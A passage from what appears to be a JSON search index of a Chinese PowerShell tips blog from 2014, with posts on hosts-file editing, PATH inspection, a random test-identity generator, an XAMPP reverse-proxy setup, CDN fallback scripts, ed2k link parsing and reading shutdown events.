$Path = &quot;$env:windir\\system32\\drivers\\etc\\hosts&quot; Start-Process -FilePath notepad -ArgumentList $Path -Verb runas }","link":"/2014/08/05/edit-network-hosts-file/"},{"title":"用 PowerShell 快速查看 PATH 环境变量","text":"我们常常需要查看 PATH 环境变量里是否有我们需要的路径。通常的做法是： 依次打开 系统属性 / 高级 / 环境变量。 分别在“用户变量”和“系统变量”列表框中双击 PATH 条目。 在“变量值”窄小的文本框中检视 PATH 变量的值。 往往不得不把变量值复制粘贴到记事本中，再利用搜索功能来查找。 利用 PowerShell，可以告别以上笨拙的步骤： PS &gt; (type env:path) -split ';' 这样就可以看到一个完美分割过的列表了。当然，利用 PowerShell 强大的查询功能，还可以进一步节省眼力。例如我们要查询所有包含“_bin_”的路径： PS &gt; (type env:path) -split ';' | sls bin C:\\PROGRAM FILES (X86)\\JAVA\\JDK1.7.0_45\\JRE\\BIN C:\\PROGRAM FILES (X86)\\INTEL\\OPENCL SDK\\2.0\\BIN\\X86 C:\\PROGRAM FILES (X86)\\INTEL\\OPENCL SDK\\2.0\\BIN\\X64 C:\\PROGRAM FILES\\MICROSOFT SQL SERVER\\110\\TOOLS\\BINN\\ D:\\greensoft\\UnxUtils\\usr\\local\\wbin\\ C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\ C:\\Program Files\\TortoiseGit\\bin C:\\Chocolatey\\bin c:\\Program Files\\MongoDB 2.6 Standard\\bin","link":"/2014/08/05/quick-examine-path-env-variable-with-powershell/"},{"title":"PowerShell 技能连载 - 产生多个返回值","text":"适用于所有 PowerShell 版本 如果一个 PowerShell 函数需要产生多个返回信息，最佳的实践方式是返回多个对象，然后将信息分别存储在对象的各个属性中。 以下是一个有趣的例外情况，它在某些场景中较为适用。尽管返回多个信息就可以了，并且要确保将结果赋值给多个变量： function Get-MultipleData { Get-Date 'Hello' 1+4 } $date, $text, $result = Get-MultipleData &quot;The date is $date&quot; &quot;The text was $text&quot; &quot;The result is $result&quot; 这个测试函数产生 3 段信息，然后将结果存储在 3 个不同的变量中。","link":"/2014/08/06/returning-more-than-one-value/"},{"title":"PowerShell 技能连载 - 有趣的声音提示","text":"适用于所有 PowerShell 版本 如果您的计算机装有声卡，那么这段代码可以让您的同事们吓一跳： function prompt { 1..3 | ForEach-Object { $frequency = Get-Random -Minimum 400 -Maximum 10000 $duration = Get-Random -Minimum 100 -Maximum 400 [Console]::Beep($frequency, $duration) } 'PS&gt; ' $host.ui.RawUI.WindowTitle = Get-Location } 这段代码将会缩短您的 PowerShell 提示符，并且在标题栏上显示当前的路径。这还算是有益的功能。搞破坏的部分是每次执行一条命令，都会发出随机频率的刺耳的三连音:)。","link":"/2014/08/07/a-fun-beeping-prompt/"},{"title":"用 PowerShell 生成随机身份信息","text":"在开发、运维等工作中，我们常常需要生成一些随机的身份信息，例如“张三”、“李四”……等。实际中不光需要姓名，最好还有邮箱、QQ、联系电话、身份证号等。我们可以一劳永逸地写一个 PowerShell 脚本，随时优雅地生成一大串随机身份信息，取之不尽用之不竭。使用效果如下（当然也可以用 Export-Csv 轻松导出到 Excel 或者用 ConvertTo-Html 生成网页）： 根据 *PowerShell 技术交流 QQ 群今天的讨论，以及 shrekz 的 powershell 生成随机用户信息，我做了一些改进。增加了生日、性别、身份证号等。设计要点如下： QQ 号和邮箱须对应。身份证号的第 1-6 位是地区号码，应符合 G​B​T​2​2​6​0​—​1​9​9​9 规范。 身份证号的第 7-13 位是生日号码，不能和同一个人的生日号码矛盾。 身份证号的第 17 位，对于男性是奇数，对于女性是偶数，不能和同一个人的性别矛盾。 身份证号的第 18 位是校验位，根据 ISO 7064:1983.MOD 11-2 规范计算。 生成身份证号时，既可以指定生日号码和性别，也可以随机生成。 以下是一个可重用的模块 Get-Identity.psm1，可以把它保存在 %PSModulePath% 目录中，随时调用： $firstNames = (@' 赵钱孙李周吴郑王冯陈褚卫蒋沈韩杨朱秦尤许何吕施张孔曹严华金魏陶姜戚谢邹喻柏水窦章 云苏潘葛奚范彭郎鲁韦昌马苗凤花方俞任袁柳酆鲍史唐费廉岑薛雷贺倪汤滕殷罗毕郝邬安常 乐于时傅皮卞齐康伍余元卜顾孟平黄和穆萧尹 '@.Split((&quot;`n&quot;, &quot;`r&quot;)) -join $null).ToCharArray() $secondNames = (@' 一丁三专世业丝中丰临丹丽举乃义乐乔书云亘亮人仁今仙令仪伟伯伶佑作佩佳侠侬俊俏俐信 修倩健偲儿允元兆光兰兴其典军冠冬冰凌凝凡凯刚初利力勃勇勋化北千卉华卓博卫卿厚原友 双发叡可叶司合吉同名向君吟听启周和咏咸品哲唱善喆喜嗣嘉囡国圣坚基堂墨壁夏多天奇奕 奥好如妃妍妙妞妮姗姝姣娅娇娜娟娥娴婉婧婵婷媚媛嫒嫔嫚子存孟季学宁宇安宜宝实宣宵家 宸容宾密寒寰寻寿小尘尚尹展山岑岚峯峰峻巍州工巧布帅帆希干平年广庆康庸延建弘强弼彤 彦彩彬彭影微德心志忠念忻怀思怡恩恬恺悟悦情惜惠愉意慈慕慧懋懿成才扬承抒拔振捷掣敏 教文斌斯新方施旎旭旻昂昊昌明易昕星春昶晋晓晔晖晤晨景晴晶智暄暖暮曜曦曲曼曾月朋朔 朗望朝木本朵杉杏材杰松林枝枫柏柔柳栋树格桃桐梅梓梦棠森楚楠欢欣歆歌正武毅民水永江 池沈沉沙沛河泉波泰泽洁洛津洮洲流济浓浦浩海涉涛润涵淑淳淼清渊温湃湉湘源溥溪滢滨漪 漫澄澍澹濮濯瀚灵灿炎炳烁烨焕焱然煜煦熙熠燕爽牧献玄玉玑玛玟玲珉珊珍珑珠珺琅琇琛琦 琨琪琲琳琴琼瑜瑞瑶瑾璇璞瓃甜用甫田甲男画畅略白皎益盼真睿知石碧磊礼祖祥祯祺禄福禧 禾秀秉秋程穆空立章童端竹笑笛筠简箫籁米精素红纬纳纵纶经绢绣绮维罗罡美羡羽翎翔翠翮 翰翼耀聪胜能自致舒舟航良艳艺艾芃芊芝芦芬花芳芸苑苗若英茂范茉茗茜茵荌荣荫莉莎莘莲 莹菁菊菡菱菲萌萍萝萧萱蒙蓉蓓蓝蔓蔚蕊蕙蕴蕾薄薇藉藻虎虹蝶行衣裕西言誉许识诗诚语诺 谊谧谷豪贝贞贤资赋赐赡赫超越跃路轩载辉辰达迈运进远迪逸邈邵郁郎采金鑫铃铄锋锐锦长 闲闵阳阵陶隽雄雅雨雪雯雰霁霓霖霞露青靓靖静韦音韵韶顺颀颖颜飇风飙飞香馨驰驹骄高魁 魄鲲鲸鸣鸾鸿鹍鹏麦默黛齐龙 '@.Split((&quot;`n&quot;, &quot;`r&quot;)) -join $null).ToCharArray() $mobilePrefixes = @' 134 135 136 137 138 139 147 150 151 152 157 158 159 182 187 188 147 157 188 130 131 132 155 156 185 186 186 133 153 180 189 189 200 133 150 151 152 153 155 156 157 158 159 130 131 132 133 134 135 136 137 138 139 180 182 185 186 187 188 189 170 '@.Split((&quot;`n&quot;, &quot;`r&quot;, &quot; &quot;), 'RemoveEmptyEntries') $cityCodes = @' 410701 341101 130901 130601 331001 230501 370601 659001 450301 120221 620701 341001 210201 510101 130501 320901 520401 510701 623001 450401 650201 420901 360701 620401 510501 542521 620501 232701 530401 611001 340401 321301 520101 320401 430501 653101 460101 220301 640201 610801 440501 450701 533421 429004 522401 532901 532801 130101 652101 445301 320601 410301 140201 530501 632121 511301 210501 152921 140901 330701 410101 350501 621101 350901 652801 652201 210801 440801 341801 500101 371401 411301 341501 141101 371301 440301 522201 231101 510901 330601 450201 350301 150201 220101 440901 411601 371101 320101 632221 330301 622901 130201 140101 131001 430301 610701 640101 450801 360601 131101 650101 440101 210301 632801 360401 231001 320801 530601 610201 210701 632321 360501 440201 512001 542621 370901 320201 220501 230801 220401 110228 430401 451201 340701 542301 130401 360201 410901 620601 150301 150801 140401 451001 532501 370101 440601 321001 411701 321101 654002 451401 410501 220801 350401 330201 522301 130701 420301 445101 420701 421301 211201 511701 420601 '@.Split((&quot;`n&quot;, &quot;`r&quot;, &quot; &quot;), 'RemoveEmptyEntries') function Get-RandomName { return ($firstNames|Get-Random) + (($secondNames|Get-Random -Count ((1,2)|Get-Random)) -join $null) } function Get-RandomQQ { return [string](Get-Random -Minimum 100000 -Maximum 9999999999) } function Get-RandomEMail ($QQ) { if ($QQ) { return &quot;$QQ@qq.com&quot; } else { return (Get-RandomQQ) + '@qq.com' } } function Get-RandomMobile { return ($mobilePrefixes | Get-Random) + ((0..9 | Get-Random -count 8) -join $null) } function Get-RandomSex { return ('男', '女' | Get-Random) } function Get-RandomBirthday { return (Get-Date).AddDays(-(Get-Random -Maximum (365 * 110))).Date } function Get-RandomID ([DateTime]$Birthday, $Sex){ $cityCode = $cityCodes | Get-Random #$cityCode = (0..9 | Get-Random -Count 6) -join $null if (!$Birthday) { $Birthday = Get-RandomBirthday } $birthdayCode = '{0:yyyyMMdd}' -f $Birthday if ($Sex -eq '男' -or $Sex -eq $true) { $seq = (Get-Random -Minimum 0 -Maximum 49) * 2 + 1 } else { $seq = (Get-Random -Minimum 0 -Maximum 49) * 2 + 2 } $result = '{0}{1}{2:D3}' -f $cityCode, $birthdayCode, $seq $w = @(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2) $total = 0 for ($i = 0; $i -lt 17; $i++) { $total += $w[$i] * [int]::parse($result[$i]) } $checkCode = [string]($total % 11) $checkCode = '10X98765432'[$checkCode] $result = $result + $checkCode return $result } function Get-RandomIdentity { $qq = Get-RandomQQ $birthday = Get-RandomBirthday $sex = Get-RandomSex return [pscustomobject][ordered]@{ Name = Get-RandomName; QQ = $qq; EMail = Get-RandomEMail -QQ $qq; Mobile = Get-RandomMobile; Birthday = '{0:yyyy/MM/dd}' -f $birthday Sex = $sex ID = Get-RandomID -Birthday $birthday -Sex $sex } } Export-ModuleMember * 测试代码 Test-GetIdentity.ps1： if (Get-Module Get-Identity) { Remove-Module Get-Identity } Import-Module .\\Get-Identity.psm1 Get-RandomName # 生成随机的姓名 Get-RandomQQ # 生成随机的 QQ 号 Get-RandomEMail # 生成随机的 e-mail Get-RandomMobile # 生成随机的手机号 '{0:yyyy/MM/dd}' -f (Get-RandomBirthday) # 生成随机的生日 Get-RandomSex # 生成随机的性别 Get-RandomID # 生成随机的身份证号 Get-RandomIdentity # 生成随机的身份信息 # 批量生成 20 个完整的身份信息 1..20 | % { Get-RandomIdentity } | Out-GridView -Title 随机身份信息 输出结果： 孔懿 9903344437 7351437013@qq.com 15248325719 1950/02/24 男 450301200801030764 Name : 方盼 QQ : 8679192225 EMail : 8679192225@qq.com Mobile : 13923186497 Birthday : 2005/11/09 Sex : 男 ID : 130101200511090819 以及文章开头显示的那个图形化列表。 您也可以下载完整的 源代码 和 测试脚本。 另外如果您对如何提取区域代码感兴趣的话，还可以下载国标行政区划数据 GBT2260-1999.xml 和对应的解析程序 GBT2260.ps1 来研究。","link":"/2014/08/07/generate-random-identity-with-powershell/"},{"title":"PowerShell 技能连载 - 记录脚本做了什么事","text":"适用于所有 PowerShell 版本 您应该知道在 PowerShell 控制台（不是 ISE 编辑器）中，您可以打开记录功能： PS&gt; Start-Transcript 这将会把所有键入的命令以及所有的命令执行结果都记录到一个文件中。不幸的是，当您运行一个脚本的时候，作用就受限了，因为您无法看到实际的脚本命令。 以下是一个激进的技巧，能够记录包括所有脚本中执行的命令。在您尝试这个技巧之前，请注意这将增加您的日志文件大小并且会导致脚本执行变慢，因为在循环体中，每一次循环都会被记录下来。 只要执行这行代码就可以打开脚本命令记录了： PS&gt; Set-PSDebug -Trace 1","link":"/2014/08/08/logging-what-a-script-does/"},{"title":"PowerShell 技能连载 - 用 PowerShell 来励志","text":"适用于所有 PowerShell 版本 编写 PowerShell 代码是十分带劲的，但是某些时候会令人感到沮丧。这是一个用 PowerShell 来励志的函数。只需要打开音箱，PowerShell 会在您执行每一条命令之后鼓励你。 function prompt { $text = 'You are great!', 'Hero!', 'What a checker you are.', 'Champ, well done!', 'Man, you are good!', 'Guru stuff I would say.', 'You are magic!' 'PS&gt; ' $host.UI.RawUI.WindowTitle = Get-Location (New-Object -ComObject Sapi.SpVoice).Speak(($text | Get-Random)) }","link":"/2014/08/11/have-powershell-cheer-you-up/"},{"title":"HTML CSS 学习路线","text":"入门网站 w3school 在线教程 MDN 教程 API 文档 Web API reference - Web technology reference - 来自 MDN HTML HTML5 - Web 开发者指南 CSS CSS3 - CSS 编码规范 Google HTML/CSS Style Guide - Google 版，需翻墙。中文版尚未发布，请关注 zh-google-styleguide/zh-google-styleguide CSS · Styleguide - GitHub 版本 编码规范 by @mdo - BootStrap 中文网。其中的“属性顺序”值得参考。 idiomatic-css/translations/zh-CN at master · necolas/idiomatic-css WordPress › CSS Coding Standards « Make WordPress Core - WordPress 版 CSS命名及书写规范 - WEB开发者 在线编辑器 RunJS - 在线编辑、展示、分享、交流你的 JavaScript 代码 - 开源中国提供，访问速度快，功能略简单。 CodePen - Front End Developer Playground &amp; Code Editor in the Browser - 功能最强，国外，访问慢。 JSFiddle - 国外，访问慢。 Pastebin.com - #1 paste tool since 2002! The World’s Most Powerful Browser-Based IDE - Codio - 国外，访问慢。 类 gist Gists codepad Ideone.com - Online Compiler and IDE &gt;&gt; C/C++, Java, PHP, Python, Perl and 40+ other compilers and interpreters","link":"/2014/08/12/html-css-guideline/"},{"title":"JavaScript 学习路线","text":"入门 JavaScript 教程 - w3school JavaScript 秘密花园 高级Dmitry Soshnikov 的 ECMA-262 及中文翻译 ECMA-262 » JavaScript. The core. JavaScript核心 ECMA-262 » ECMA-262-3 in detail. Chapter 1. Execution Contexts. [JavaScript]ECMA-262-3 深入解析.第一章.执行上下文 - Justin - 博客园 goddyzhao • 执行上下文（Execution Context） ECMA-262 » ECMA-262-3 in detail. Chapter 2. Variable object. [JavaScript]ECMA-262-3 深入解析.第二章.变量对象 - Justin - 博客园 goddyzhao • 变量对象（Variable object） ECMA-262 » ECMA-262-3 in detail. Chapter 3. This. [JavaScript]ECMA-262-3 深入解析.第三章.this - Justin - 博客园 goddyzhao • this ECMA-262 » ECMA-262-3 in detail. Chapter 4. Scope chain. goddyzhao • 作用域链（Scope Chain） ECMA-262 » ECMA-262-3 in detail. Chapter 5. Functions. goddyzhao • 函数（Functions） ECMA-262 » ECMA-262-3 in detail. Chapter 6. Closures. ** goddyzhao • 闭包（Closures） ECMA-262 » ECMA-262-3 in detail. Chapter 7.1. OOP: The general theory. ECMA-262 » ECMA-262-3 in detail. Chapter 7.2. OOP: ECMAScript implementation. ECMA-262 » ECMA-262-3 in detail. Chapter 8. Evaluation strategy. ECMA-262 » The quiz 编码规范 Google JavaScript Style Guide Javascript编程风格 - 阮一峰的网络日志","link":"/2014/08/12/javascript-guideline/"},{"title":"PowerShell 技能连载 - 用 Group-Object 来创建哈希表","text":"适用于所有 PowerShell 版本 Group-Object 能把对象输送到管道中，然后在一个管道中把属性相同的对象排在一起。 这个功能十分有用，特别是当您用 Group-Object 来返回哈希表时。它将生成一个按服务状态分组的哈希表： $hash = Get-Service | Group-Object -Property Status -AsHashTable -AsString 您现在可以通过这种方式获取所有正在运行（或已停止的）服务： $hash.Running $hash.Stopped 可以用任何想要的属性来分组。这个例子将用三个组来分组文件：一组为小文件，一个组为中等文件，另一个组位大文件。 $code = { if ($_.Length -gt 1MB) {'huge'} elseif ($_.Length -gt 10KB) {'average'} else {'tiny'} } $hash = Get-ChildItem -Path c:\\windows | Group-Object -Property $code -AsHashTable -AsString #$hash.Tiny $hash.Huge","link":"/2014/08/12/use-group-object-to-create-hash-tables/"},{"title":"PowerShell 技能连载 - 使用“打开文件”对话框","text":"适用于 PowerShell 3.0 及以上版本 以下是一个快捷的函数，可以用在 ISE 编辑器和 PowerShell 控制台中（适用于 PowerShell 3.0 及以上版本）：Show-OpenFileDialog。 function Show-OpenFileDialog { param ( $StartFolder = [Environment]::GetFolderPath('MyDocuments'), $Title = 'Open what?', $Filter = 'All|*.*|Scripts|*.ps1|Texts|*.txt|Logs|*.log' ) Add-Type -AssemblyName PresentationFramework $dialog = New-Object -TypeName Microsoft.Win32.OpenFileDialog $dialog.Title = $Title $dialog.InitialDirectory = $StartFolder $dialog.Filter = $Filter $resultat = $dialog.ShowDialog() if ($resultat -eq $true) { $dialog.FileName } } 这个函数将打开一个“打开文件”对话框。用户可以选择一个文件，并且选择的文件对象将返回给 PowerShell。所以下次您的脚本需要打开一个 CSV 文件时，您可能就能用上。","link":"/2014/08/13/using-the-openfile-dialog/"},{"title":"PowerShell 技能连载 - 修正 ISE 的编码","text":"适用于所有 PowerShell 版本 当您在 ISE 编辑器中运行一个控制台程序时，非标准字符，例如“ä”或“ß”将会显示不正常。要修正 ISE 和隐藏的控制台之间通信的编码，请使用这段代码： # Repair encoding. This REQUIRES a console app to run first because only # then will ISE actually create its hidden background console $null = cmd.exe /c echo [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 # Now all is fine cmd.exe /c echo ÄÖÜäöüß","link":"/2014/08/14/correcting-ise-encoding/"},{"title":"用 XAMPP 搭建反向代理服务器","text":"公网 IP 地址 + 80 端口是稀缺资源。在开发、测试阶段，我们常常需要在一个公网 IP 的 80 端口上，绑定多个 WEB 服务，这些服务可能部署在内网的多台异构服务器上（不同操作系统、不同服务器软件）。 用表格来表达就是： 外网访问 重定向到 http://home.test.com http://127.0.0.1:81 http://img.test.com http://127.0.0.1:82 http://js.test.com http://127.0.0.1:83 在 Linux 下，可以通过 vhost 程序来实现这个需求。在 Windows 下，我们有 XAMPP 和 IIS 两种选择。本文重点介绍 XAMPP 的实现方式。 分别搭建 3 个测试服务器可以采用这些小工具快速创建测试服务器： anywhere HFS ~ HTTP File Server 设置 hosts 以便测试首先要让 3 个域名都指向本机。我们可以直接修改本地 hosts 文件以便测试。这种方式立刻生效，免去申请域名的麻烦。 用提升权限的记事本打开 %windir%\\system32\\drivers\\etc\\hosts 文件，加入这段： 127.0.0.1 home.test.com 127.0.0.1 img.test.com 127.0.0.1 js.test.com 这里有个快捷的方法，参见：PowerShell 技能连载 - 编辑“hosts”文件。 搭建 XAMPP 环境请参见 XAMPP 学习路线。只需要其中的 Apache 模块即可。确保 XAMPP 能够正常启动，并能够通过 http://127.0.0.1 访问缺省页面。 设置 XAMPP编辑 xampp\\apache\\conf\\httpd.conf，将 LoadModule proxy_http_module modules/mod_proxy_http.so 前的 # 号去掉。 编辑 xampp\\apache\\conf\\extra\\httpd-vhosts.conf，在尾部添加： ProxyRequests Off &lt;Proxy *&gt; Order deny,allow Allow from all &lt;/Proxy&gt; &lt;VirtualHost *:80&gt; ServerName blog.test.com ProxyPass / http://127.0.0.1:81/ ProxyPassReverse / http://127.0.0.1:81/ &lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt; ServerName img.test.com ProxyPass / http://127.0.0.1:82/ ProxyPassReverse / http://127.0.0.1:82/ &lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt; ServerName js.test.com ProxyPass / http://127.0.0.1:83/ ProxyPassReverse / http://127.0.0.1:83/ &lt;/VirtualHost&gt; 重启 XAMPP 中的 Apache 组件 姊妹篇 - 用 IIS 搭建反向代理服务器用 IIS 也可以实现相同的功能。 IIS实现反向代理 - 爱做梦的鱼 - 博客园 iis7 配置反向代理_justin_新浪博客 注意有个坑： 用 %windir%\\System32\\inetsrv\\iis.msc 或通过“这台电脑 - 右键 - 计算机管理” 启动 IIS 管理器，可能看不到 ARR 组件而通过 %windir%\\system32\\inetsrv\\InetMgr.exe 则可以看到。 鸣谢 XAMPP 方式，在网友 坎坎 的指导下实现。 IIS 方式，在网友 莫名 的指导下实现。 参考文章 XAMPP 反向代理配置 - 绿的日志 - 网易博客 - 里面的路径等稍有不对，所以本文重新整理。","link":"/2014/08/14/reverse-proxy-with-xampp/"},{"title":"XAMPP 学习路线","text":"XAMPP = Apache + MySQL + PHP + Perl XAMPP是最流行的PHP开发环境 XAMPP是完全免费且易于安装的Apache发行版，其中包含MySQL、PHP和Perl。XAMPP开放源码包的设置让安装和使用出奇容易。 网站XAMPP 官方网站XAMPP - SourceForge 文件区别 安装版（适合小型服务器安装） xampp-win32-*-installer.exe - 有安装向导。 xampp-win32-*.zip - 解开是一个 xampp 目录，但可以随后注册服务等。 xampp-win32-*.7z - 和 .zip 版相同，压缩后体积更小。 便携版（适合开发测试。不包含 FileZilla FTP 和 Mercury Mail Server，不能安装服务） xampp-portable-win32-*-installer.exe xampp-portable-win32-*.zip xampp-portable-win32-*.7z 快速起步切勿自己摸索！因为不同的版本的步骤有所不同。请阅读 xampp\\readme_en.txt 中的 QUICK INSTALLATION 节。篇幅很短，不用担心 :) 潜在陷阱 必须安装（或解压到）根目录下。例如 D:\\xampp，或者 E:\\xampp。 注意缺省的 80 和 443 端口未被其它程序占用。netstat -ano |find &quot;80&quot;、netstat -ano |find &quot;443&quot; 如果用安装版的压缩包（.zip 或 .7z），并需要安装服务，请用提升权限的管理员账户打开 xampp-control.exe 进行安装。 如果要能让别的机器或外网访问，请注意配置防火墙。 通过 xampp-control.exe 启动，可能看不到完整的错误提示。请在命令行下启动 xampp_start.exe，可以看到更详细的错误提示。 如果遇到错误，可以根据 xampp-control.exe 面板上的各个 Logs 按钮找到相应的日志。另外，可以通过 Windows 的事件查看部分日志。","link":"/2014/08/14/xampp-guideline/"},{"title":"PowerShell 技能连载 - 获取指定扩展名的文件","text":"适用于 PowerShell 所有版本 当您使用 Get-ChildItem 来获取一个文件列表时，您可能会注意到 -Filter 参数有时候会导致返回比你预期的更多的文件。 以下是一个例子。这段代码并不只是返回“.ps1”扩展名的文件，而也会返回“.ps1xml”扩展名的文件： Get-ChildItem -Path C:\\windows -Recurse -ErrorAction SilentlyContinue -Filter *.ps1 要限制只返回您需要的扩展名的文件，请用一个 cmdlet 来过滤结果： Get-ChildItem -Path C:\\windows -Recurse -ErrorAction SilentlyContinue -Filter *.ps1 | Where-Object { $_.Extension -eq '.ps1' } 这将只返回您指定的扩展名的文件。","link":"/2014/08/15/getting-files-with-specific-extensions-only/"},{"title":"PowerShell 技能连载 - 用正则表达式搜索文件","text":"适用于 PowerShell 所有版本 Get-ChildItem 不支持高级的文件过滤。当您使用简单的通配符时，无法利用上正则表达式。 要用上正则表达式，需要增加一个过滤用的 cmdlet 和 -match 操作符。 这个例子将在 Windows 目录中查找所有文件名包含至少 2 位数字，且文件名不超过 8 个字符的文件： Get-ChildItem -Path $env:windir -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.BaseName -match '\\d{2}' -and $_.Name.Length -le 8 } 请注意 BaseName 属性的使用。它只返回主文件名（不包含扩展名）。通过这种方式，扩展名中的数字不会被包含在内。","link":"/2014/08/18/searching-files-with-regular-expressions/"},{"title":"用 PowerShell 解析 eD2k 链接","text":"电骡的 eD2k 链接包含了丰富的信息。例如这个： ed2k://|file|BingPinyinSetup_1.5.24.02.exe|31485072|C8C9282E6112455E624EE82941E5BA00|p=79A822E1788353E0B289D2ADD5DA3BDE:FB9BB40DEDB1D2307E9D734A6416704B:0732B122C4ECF70065B181C92BF72400:437958DF590D764DE1694F91AC085225|h=HLXRQSANEO5MHIVOYNM5FNQOHJG3D5MP|s=http://blog.vichamp.com|s=http://www.baidu.com|/|sources,127.0.0.1:1234,192.168.1.1:8888|/ 这给我们的第一感觉是可以用正则表达式来解析。我们观察一下它的规律，发现它是用 | 分割的字符串： ed2k:// file BingPinyinSetup_1.5.24.02.exe 31485072 C8C9282E6112455E624EE82941E5BA00 p=79A822E1788353E0B289D2ADD5DA3BDE:FB9BB40DEDB1D2307E9D734A6416704B:0732B122C4ECF70065B181C92BF72400:437958DF590D764DE1694F91AC085225 h=HLXRQSANEO5MHIVOYNM5FNQOHJG3D5MP s=http://www.abc.com/def.zip s=http://www.vichamp.com/qq.zip / sources,127.0.0.1:1234,192.168.1.1:8888 / 还有一些规律： 从 p= 开始，后面的段都是可选的。 p=xxx、h=xxx、s=xxx看起来像键值对。 s= 可以有多个，sources 后面的 IP 和端口可以有多对。 根据这个规律，我们可以很容易地构造出正则表达式，并用 PowerShell 解析它。 function Get-Ed2kLink { Param( [string] [Parameter(Mandatory = $true, ValueFromPipeline = $true, HelpMessage = 'Enter an ed2k:// url')] $Link ) $regex = [regex]@' (?x) \\bed2k:// \\|file\\|(?&lt;FILE_NAME&gt;[^|]+) \\|(?&lt;FILE_SIZE&gt;\\d+) \\|(?&lt;FILE_HASH&gt;[0-9a-fA-F]+) (?:\\|p=(?:(?&lt;HASH_SET&gt;[0-9a-fA-F]+):?)+)? (?:\\|h=(?&lt;ROOT_HASH&gt;[0-9a-zA-Z]+))? (?:\\|s=(?&lt;HTTP_SOURCE&gt;[^|]+))* \\|\\/ \\|sources(?:,(?&lt;SOURCES_HOST&gt;[0-9a-zA-Z.]+):(?&lt;SOURCES_PORT&gt;\\d+))* |\\/\\b '@ $match = $regex.Match($Link) if ($match.Success) { $sourcesHost = $match.Groups['SOURCES_HOST'].Captures | Select-Object -ExpandProperty Value $sourcesPort = $match.Groups['SOURCES_PORT'].Captures | Select-Object -ExpandProperty Value $sources = @() for ($i = 0; $i -lt $sourcesHost.Length; $i++) { $sources += [PSCustomObject][Ordered]@{ Host = $sourcesHost[$i] Port = $sourcesPort[$i] } } $result = [PSCustomObject][Ordered]@{ File = $match.Groups['FILE_NAME'].Value; FileSize = $match.Groups['FILE_SIZE'].Value; FileHash = $match.Groups['FILE_HASH'].Value; HashSet = $match.Groups['HASH_SET'].Captures | Select-Object -ExpandProperty Value RootHash = $match.Groups['ROOT_HASH'].Value; HttpSource = $match.Groups['HTTP_SOURCE'].Captures | Select-Object -ExpandProperty Value Sources = $sources; } } else { $result = $null } return $result } Get-Ed2kLink 'ed2k://|file|BingPinyinSetup_1.5.24.02.exe|31485072|C8C9282E6112455E624EE82941E5BA00|p=79A822E1788353E0B289D2ADD5DA3BDE:FB9BB40DEDB1D2307E9D734A6416704B:0732B122C4ECF70065B181C92BF72400:437958DF590D764DE1694F91AC085225|h=HLXRQSANEO5MHIVOYNM5FNQOHJG3D5MP|s=http://www.abc.com/def.zip|s=http://www.vichamp.com/qq.zip|/|sources,127.0.0.1:1234,192.168.1.1:8888|/' 执行结果如下： File : BingPinyinSetup_1.5.24.02.exe FileSize : 31485072 FileHash : C8C9282E6112455E624EE82941E5BA00 HashSet : {79A822E1788353E0B289D2ADD5DA3BDE, FB9BB40DEDB1D2307E9D734A6416704B, 0732B122C4ECF70065B181C92BF72400, 437958DF590D764DE1694F91AC085225} RootHash : HLXRQSANEO5MHIVOYNM5FNQOHJG3D5MP HttpSource : {http://www.abc.com/def.zip, http://www.vichamp.com/qq.zip} Sources : {@{Host=127.0.0.1; Port=1234}, @{Host=192.168.1.1; Port=8888}} 注意一下，由于 s= 和 sources 节包含循环体，所以不能直接用 PowerShell 的 -cmatch 表达式和 $Matches 变量，必须用 .NET 的 [regex] 类来处理。 参考材料： eD2k 連結 Link Creator - 用于生成 eD2k 链接。 您也可以在这里下载完整的源代码。","link":"/2014/08/18/use-powershell-to-exact-ed2k-link/"},{"title":"PowerShell 技能连载 - 复制命令行历史","text":"适用于所有 PowerShell 版本 如果您操作了一阵子 PowerShell，然后突然意识到想保存刚才输入过的命令，那么请试试这行简单的代码： (Get-History).CommandLine | clip 这段代码将您的所有命令行历史复制到剪贴板中。您可以把它粘贴到任何您喜欢的编辑器中，然后将命令保存到文件中。 如果您将命令粘贴到 PowerShell ISE 编辑器中，那么这些命令将会成为一段 PowerShell 脚本。","link":"/2014/08/19/testing/"},{"title":"CDN 资源","text":"常用 CDN 列表 [Make the Web Faster — Google Developers](https://developers.google.com/speed/* libraries/?hl=zh-CN) [Microsoft Ajax Content Delivery Network - ASP.NET Ajax Library](http://www.asp* .net/ajaxlibrary/cdn.ashx) [docs/cplat/libs - 百度开放云平台](http://developer.baidu.com/wiki/index.* php?title=docs/cplat/libs) Public Resources on SAE 开放静态文件 CDN cdnjs.com - the missing cdn for javascript and css 命令行由 开放静态文件 CDN 提供的： npm install -g sfile 详见 staticfile/cli 故障转移代码&lt;script type=&quot;text/javascript&quot; src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt;!window.jQuery &amp;&amp; document.write('&lt;script type=&quot;text/javascript&quot; src=&quot;/js/libs/jquery-2.0.3.min.js&quot;&gt;&lt;\\/script&gt;')&lt;/script&gt; 引用多个script&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.google.com/jsapi&quot;&gt;&lt;/script&gt; 引用 jQuery 时： google.load(&quot;jquery&quot;,&quot;1.3.2&quot;);","link":"/2014/08/20/cdn-guideline/"},{"title":"PowerShell 技能连载 - 获取关机信息","text":"适用于 PowerShell 所有版本 Windows 在系统事件日志中记录了所有的关机事件。您可以从那儿提取和分析信息。 以下是一个读取适当的事件日志记录、从 ReplacementStrings 数组中读取相关的信息，并以对象数组的方式返回关机信息的函数。 function Get-ShutdownInfo { Get-EventLog -LogName system -InstanceId 2147484722 -Source user32 | ForEach-Object { $result = 'dummy' | Select-Object -Property ComputerName, TimeWritten, User, Reason, Action, Executable $result.TimeWritten = $_.TimeWritten $result.User = $_.ReplacementStrings[6] $result.Reason = $_.ReplacementStrings[2] $result.Action = $_.ReplacementStrings[4] $result.Executable = Split-Path -Path $_.ReplacementStrings[0] -Leaf $result.ComputerName = $_.MachineName $result } } 现在要检查关机问题就容易多了： PS&gt; Get-ShutdownInfo | Out-GridView","link":"/2014/08/20/getting-shutdown-information-testing/"},{"title":"PowerShell 技能连载 - 过滤 Hotfix 信息","text":"适用于 PowerShell 所有版本 Get-HotFix 